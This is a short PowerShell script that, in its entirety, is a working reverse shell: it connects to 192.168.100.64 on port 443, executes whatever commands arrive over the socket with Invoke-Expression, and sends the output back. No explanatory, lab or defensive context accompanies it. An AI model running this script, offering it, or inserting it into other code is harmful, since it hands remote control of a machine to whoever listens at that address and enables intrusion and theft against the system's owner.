$client = New-Object System.Net.Sockets.TcpClient('192.168.100.64', 443); 
$stream = $client.GetStream(); 
[byte[]]$buffer = 0..65535|%{0}; 
while(($i = $stream.Read($buffer, 0, $buffer.Length)) -ne 0) {
     $data = (New-Object Text.UTF8Encoding).GetString($buffer, 0, $i);
     $result = (iex $data 2>&1 | Out-String);     
     $send = ([text.encoding]::UTF8).GetBytes($result);
     $stream.Write($send, 0, $send.Length); 
} 
$client.Close();
